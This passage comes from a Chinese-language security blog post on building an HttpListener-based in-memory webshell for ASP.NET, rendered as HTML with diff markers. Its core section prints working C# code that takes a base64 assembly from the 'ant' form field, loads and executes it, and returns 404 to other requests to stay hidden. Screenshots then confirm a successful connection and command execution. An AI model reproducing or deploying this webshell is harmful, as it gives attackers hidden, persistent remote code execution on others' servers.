+</span></span><span class="line"><span class="cl">     <span class="n">field</span><span class="p">.</span><span class="n">SetValue</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">obj</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">     <span class="n">Response</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">Form</span><span class="p">[</span><span class="s">&#34;test&#34;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl"><span class="o">%&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>可以看到，我们新构造的request对象已经可以正确获取当前请求的key-value了</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/1599908/1645337259000-ed0664c7-eb8b-437b-9a1a-9cfc42fd4827.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/1599908/1645337259000-ed0664c7-eb8b-437b-9a1a-9cfc42fd4827.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2022/png/1599908/1645337259000-ed0664c7-eb8b-437b-9a1a-9cfc42fd4827.png"
+            srcset="https://cdn.nlark.com/yuque/0/2022/png/1599908/1645337259000-ed0664c7-eb8b-437b-9a1a-9cfc42fd4827.png, https://cdn.nlark.com/yuque/0/2022/png/1599908/1645337259000-ed0664c7-eb8b-437b-9a1a-9cfc42fd4827.png 1.5x, https://cdn.nlark.com/yuque/0/2022/png/1599908/1645337259000-ed0664c7-eb8b-437b-9a1a-9cfc42fd4827.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h2 id="核心代码" class="headerLink">
+    <a href="#%e6%a0%b8%e5%bf%83%e4%bb%a3%e7%a0%81" class="header-mark"></a>5 核心代码</h2><p>Talk is cheap, show me your code.</p>
+<p>核心代码如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="n">HttpListenerContext</span> <span class="n">context</span> <span class="o">=</span> <span class="n">listener</span><span class="p">.</span><span class="n">GetContext</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="n">HttpListenerRequest</span> <span class="n">request</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">Request</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">HttpListenerResponse</span> <span class="n">response</span> <span class="o">=</span> <span class="n">context</span><span class="p">.</span><span class="n">Response</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">SetRespHeader</span><span class="p">(</span><span class="n">response</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="n">Stream</span> <span class="n">stm</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">HttpContext</span> <span class="n">httpContext</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">try</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">string</span> <span class="n">data</span> <span class="o">=</span> <span class="k">new</span> <span class="n">StreamReader</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">InputStream</span><span class="p">,</span> <span class="n">request</span><span class="p">.</span><span class="n">ContentEncoding</span><span class="p">).</span><span class="n">ReadToEnd</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="n">byte</span><span class="p">[]</span> <span class="n">rawData</span> <span class="o">=</span> <span class="n">System</span><span class="p">.</span><span class="n">Text</span><span class="p">.</span><span class="n">Encoding</span><span class="p">.</span><span class="n">Default</span><span class="p">.</span><span class="n">GetBytes</span><span class="p">(</span><span class="n">data</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">HttpRequest</span> <span class="n">req</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HttpRequest</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">,</span> <span class="n">request</span><span class="p">.</span><span class="n">Url</span><span class="p">.</span><span class="n">ToString</span><span class="p">(),</span> <span class="n">request</span><span class="p">.</span><span class="n">QueryString</span><span class="p">.</span><span class="n">ToString</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">    <span class="n">FieldInfo</span> <span class="n">field</span> <span class="o">=</span> <span class="n">req</span><span class="p">.</span><span class="n">GetType</span><span class="p">().</span><span class="n">GetField</span><span class="p">(</span><span class="s">&#34;_form&#34;</span><span class="p">,</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Instance</span> <span class="o">|</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">NonPublic</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Type</span> <span class="n">formtype</span> <span class="o">=</span> <span class="n">field</span><span class="p">.</span><span class="n">FieldType</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">MethodInfo</span> <span class="n">method</span> <span class="o">=</span> <span class="n">formtype</span><span class="p">.</span><span class="n">GetMethod</span><span class="p">(</span><span class="s">&#34;FillFromEncodedBytes&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">                                           <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Instance</span> <span class="o">|</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">NonPublic</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ConstructorInfo</span> <span class="n">constructor</span> <span class="o">=</span>
+</span></span><span class="line"><span class="cl">        <span class="n">formtype</span><span class="p">.</span><span class="n">GetConstructor</span><span class="p">(</span><span class="n">BindingFlags</span><span class="p">.</span><span class="n">NonPublic</span> <span class="o">|</span> <span class="n">BindingFlags</span><span class="p">.</span><span class="n">Instance</span><span class="p">,</span> <span class="n">null</span><span class="p">,</span> <span class="k">new</span> <span class="n">Type</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span>
+</span></span><span class="line"><span class="cl">                                <span class="n">null</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">object</span> <span class="n">obj</span> <span class="o">=</span> <span class="n">constructor</span><span class="p">.</span><span class="n">Invoke</span><span class="p">(</span><span class="n">null</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">method</span><span class="p">.</span><span class="n">Invoke</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span> <span class="k">new</span> <span class="n">object</span><span class="p">[]</span> <span class="p">{</span> <span class="n">rawData</span><span class="p">,</span> <span class="n">request</span><span class="p">.</span><span class="n">ContentEncoding</span> <span class="p">});</span>
+</span></span><span class="line"><span class="cl">    <span class="n">field</span><span class="p">.</span><span class="n">SetValue</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">obj</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">StreamWriter</span> <span class="n">writer</span> <span class="o">=</span> <span class="k">new</span> <span class="n">System</span><span class="p">.</span><span class="n">IO</span><span class="p">.</span><span class="n">StreamWriter</span><span class="p">(</span><span class="n">response</span><span class="p">.</span><span class="n">OutputStream</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">HttpResponse</span> <span class="n">resp</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HttpResponse</span><span class="p">(</span><span class="n">writer</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">httpContext</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HttpContext</span><span class="p">(</span><span class="n">req</span><span class="p">,</span> <span class="n">resp</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">Form</span><span class="p">[</span><span class="s">&#34;ant&#34;</span><span class="p">]</span> <span class="o">!=</span> <span class="n">null</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">Assembly</span> <span class="n">assembly</span> <span class="o">=</span>
+</span></span><span class="line"><span class="cl">            <span class="n">System</span><span class="p">.</span><span class="n">Reflection</span><span class="p">.</span><span class="n">Assembly</span><span class="p">.</span><span class="n">Load</span><span class="p">(</span><span class="n">Convert</span><span class="p">.</span><span class="n">FromBase64String</span><span class="p">(</span><span class="n">req</span><span class="p">.</span><span class="n">Form</span><span class="p">[</span><span class="s">&#34;ant&#34;</span><span class="p">]));</span>
+</span></span><span class="line"><span class="cl">        <span class="n">assembly</span><span class="p">.</span><span class="n">CreateInstance</span><span class="p">(</span><span class="n">assembly</span><span class="p">.</span><span class="n">GetName</span><span class="p">().</span><span class="n">Name</span> <span class="o">+</span> <span class="s">&#34;.Run&#34;</span><span class="p">).</span><span class="n">Equals</span><span class="p">(</span><span class="n">httpContext</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">httpContext</span><span class="p">.</span><span class="n">Response</span><span class="p">.</span><span class="n">End</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">//Console.WriteLine(&#34;filter end&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span><span class="p">.</span><span class="n">StatusCode</span> <span class="o">=</span> <span class="mi">404</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span><span class="p">.</span><span class="n">ContentLength64</span> <span class="o">=</span> <span class="n">not_found</span><span class="p">.</span><span class="n">Length</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">stm</span> <span class="o">=</span> <span class="n">response</span><span class="p">.</span><span class="n">OutputStream</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">stm</span><span class="p">.</span><span class="n">Write</span><span class="p">(</span><span class="n">not_found</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">not_found</span><span class="p">.</span><span class="n">Length</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="测试" class="headerLink">
+    <a href="#%e6%b5%8b%e8%af%95" class="header-mark"></a>6 测试</h2><p>修改Prefix为自定义路径，启动exe</p>
+<p>测试连接成功</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/1599908/1645337774044-9762e7a9-73e2-40af-a442-01a96d89acc7.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/1599908/1645337774044-9762e7a9-73e2-40af-a442-01a96d89acc7.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2022/png/1599908/1645337774044-9762e7a9-73e2-40af-a442-01a96d89acc7.png"
+            srcset="https://cdn.nlark.com/yuque/0/2022/png/1599908/1645337774044-9762e7a9-73e2-40af-a442-01a96d89acc7.png, https://cdn.nlark.com/yuque/0/2022/png/1599908/1645337774044-9762e7a9-73e2-40af-a442-01a96d89acc7.png 1.5x, https://cdn.nlark.com/yuque/0/2022/png/1599908/1645337774044-9762e7a9-73e2-40af-a442-01a96d89acc7.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>查看debug日志，能够正确获取到path参数</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/1599908/1644760474387-4b8e149e-591c-44ec-a573-b81942feeaf1.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/1599908/1644760474387-4b8e149e-591c-44ec-a573-b81942feeaf1.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2022/png/1599908/1644760474387-4b8e149e-591c-44ec-a573-b81942feeaf1.png"
+            srcset="https://cdn.nlark.com/yuque/0/2022/png/1599908/1644760474387-4b8e149e-591c-44ec-a573-b81942feeaf1.png, https://cdn.nlark.com/yuque/0/2022/png/1599908/1644760474387-4b8e149e-591c-44ec-a573-b81942feeaf1.png 1.5x, https://cdn.nlark.com/yuque/0/2022/png/1599908/1644760474387-4b8e149e-591c-44ec-a573-b81942feeaf1.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<p>成功进入路径，其他操作也是可以正常执行的</p>
+<p><figure><a class="lightgallery" href="https://cdn.nlark.com/yuque/0/2022/png/1599908/1644760456257-58343f59-dd7b-408e-a111-c0de8ae1a2fd.png" title="img" data-thumbnail="https://cdn.nlark.com/yuque/0/2022/png/1599908/1644760456257-58343f59-dd7b-408e-a111-c0de8ae1a2fd.png">
+        <img
+            
+            loading="lazy"
+            src="https://cdn.nlark.com/yuque/0/2022/png/1599908/1644760456257-58343f59-dd7b-408e-a111-c0de8ae1a2fd.png"
+            srcset="https://cdn.nlark.com/yuque/0/2022/png/1599908/1644760456257-58343f59-dd7b-408e-a111-c0de8ae1a2fd.png, https://cdn.nlark.com/yuque/0/2022/png/1599908/1644760456257-58343f59-dd7b-408e-a111-c0de8ae1a2fd.png 1.5x, https://cdn.nlark.com/yuque/0/2022/png/1599908/1644760456257-58343f59-dd7b-408e-a111-c0de8ae1a2fd.png 2x"
+            sizes="auto"
+            alt="img">
+    </a></figure></p>
+<h2 id="参考链接" class="headerLink">
+    <a href="#%e5%8f%82%e8%80%83%e9%93%be%e6%8e%a5" class="header-mark"></a>7 参考链接</h2><p><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.net.httplistenerrequest?view=netframework-3.0" target="_blank" rel="noopener noreferrer">https://docs.microsoft.com/zh-cn/dotnet/api/system.net.httplistenerrequest?view=netframework-3.0</a></p>
+<p><a href="https://docs.microsoft.com/zh-cn/dotnet/api/system.web.httprequest?view=netframework-4.8" target="_blank" rel="noopener noreferrer">https://docs.microsoft.com/zh-cn/dotnet/api/system.web.httprequest?view=netframework-4.8</a></p>
+<p><a href="https://mp.weixin.qq.com/s/zsPPkhCZ8mhiFZ8sAohw6w" target="_blank" rel="noopener noreferrer">https://mp.weixin.qq.com/s/zsPPkhCZ8mhiFZ8sAohw6w</a></p>
+<p><a href="http://yzddmr6.com/posts/%e8%81%8a%e8%81%8a%e6%96%b0%e7%b1%bb%e5%9e%8bASPXCSharp/" target="_blank" rel="noopener noreferrer">http://yzddmr6.com/posts/%E8%81%8A%E8%81%8A%E6%96%B0%E7%B1%BB%E5%9E%8BASPXCSharp/</a></p>
+</div>
+
+        
+
+<div class="sponsor">
+        <div class="sponsor-avatar"><img
+        
+        loading="lazy"
+        src="/images/avatar.webp"
+        srcset="/images/avatar.webp, /images/avatar.webp 1.5x, /images/avatar.webp 2x"
+        sizes="auto"
+        alt="/images/avatar.webp"
+        title="/images/avatar.webp" height="640"   width="640" ></div><p class="sponsor-bio"><em>欢迎加入我的知识星球，共同交流网络安全技术~</em></p><div class="sponsor-custom"><a href="https://t.zsxq.com/FA6urjI" target="_blank"><img src="/zsxq.png" alt="网络安全回收站" style="width:50%;display:inline-block;" ></a></div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2022-05-04</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share"><button title="分享到 Twitter" data-sharer="twitter" data-url="https://yzddmr6.com/posts/asp-net-memory-shell-httplistener/" data-title="ASP.NET下的内存马(三)：HttpListener内存马"><span class="fab fa-twitter fa-fw"></span></button><button title="分享到 Facebook" data-sharer="facebook" data-url="https://yzddmr6.com/posts/asp-net-memory-shell-httplistener/"><span class="fab fa-facebook-square fa-fw"></span></button><button title="分享到 Hacker News" data-sharer="hackernews" data-url="https://yzddmr6.com/posts/asp-net-memory-shell-httplistener/" data-title="ASP.NET下的内存马(三)：HttpListener内存马"><span class="fab fa-hacker-news fa-fw"></span></button><button title="分享到 Line" data-sharer="line" data-url="https://yzddmr6.com/posts/asp-net-memory-shell-httplistener/" data-title="ASP.NET下的内存马(三)：HttpListener内存马"><span data-svg-src="/lib/simple-icons/icons/line.min.svg"></span></button><button title="分享到 微博" data-sharer="weibo" data-url="https://yzddmr6.com/posts/asp-net-memory-shell-httplistener/" data-title="ASP.NET下的内存马(三)：HttpListener内存马"><span class="fab fa-weibo fa-fw"></span></button><button title="分享到 Telegram" data-sharer="telegram" data-url="https://yzddmr6.com/posts/asp-net-memory-shell-httplistener/" data-title="ASP.NET下的内存马(三)：HttpListener内存马" data-web><span class="fab fa-telegram-plane fa-fw"></span></button><script>
+        function shareOnMastodon(title, link) {
+            const SHARE_MASTODON_DOMAIN = "share_mastodon_domain"
+            const savedDomain = localStorage.getItem(SHARE_MASTODON_DOMAIN) ?? "mastodon.social";
+            const domain = prompt("Enter your Mastodon domain", savedDomain);
+            if (domain === null) {
+                return;
+            }
+            localStorage.setItem(SHARE_MASTODON_DOMAIN, domain)
+            const text = title + "\n\n" + link;
+            const url = new URL("https://" + domain)
+            url.pathname = "share"
+            url.searchParams.append('text', text)
+            window.open(url, '_blank', "width=500,height=500,left=500,toolbar=0,status=0");
+        }
+    </script>
+    <button title="分享到 Mastodon"onclick="javascript:shareOnMastodon(&#34;ASP.NET下的内存马(三)：HttpListener内存马&#34;, &#34;https://yzddmr6.com/posts/asp-net-memory-shell-httplistener/&#34;)"><span class="fab fa-mastodon fa-fw"></span></button></div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/as-exploits-sharploader/" class="prev" rel="prev" title="讲讲As-Exploits新模块SharpLoader"><i class="fas fa-angle-left fa-fw"></i>讲讲As-Exploits新模块SharpLoader</a>
+            <a href="/posts/asp-net-memory-shell-virtualpath/" class="next" rel="next" title="ASP.NET下的内存马(四) VirtualPath内存马">ASP.NET下的内存马(四) VirtualPath内存马<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+<div id="comments"><div id="utterances"></div><noscript>
+                Please enable JavaScript to view the comments powered by <a href="https://utteranc.es/">Utterances</a>.
+            </noscript></div></article></div>
+        </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/yzddmr6" target="_blank" rel="noopener noreferrer">yzddMr6</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+            <div class="footer-line"></div>
+            <div class="footer-line">
+            </div>
+        </div></footer></div>
+
+    <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
+            <i class="fas fa-arrow-up fa-fw"></i>
+        </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+            <i class="fas fa-comment fa-fw"></i>
+        </a>
+    </div><div class="assets"><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":10},"comment":{"utterances":{"darkTheme":"github-dark","issueTerm":"pathname","label":"","lightTheme":"github-light","repo":"Hugo-DoIt/utterances-comments"}},"search":{"algoliaAppID":"5YGRNRQK1G","algoliaIndex":"zh_cn_index","algoliaSearchKey":"0ff6874805de24b84aa1d5ebccad56cd","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"},"sharerjs":true,"table":{"sort":true}};</script><script type="text/javascript" src="/lib/tablesort/tablesort.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/js/theme.min.js" defer></script><script type="text/javascript" src="/js/utterances.min.js" defer></script></div>
+</body>
+
+</html>
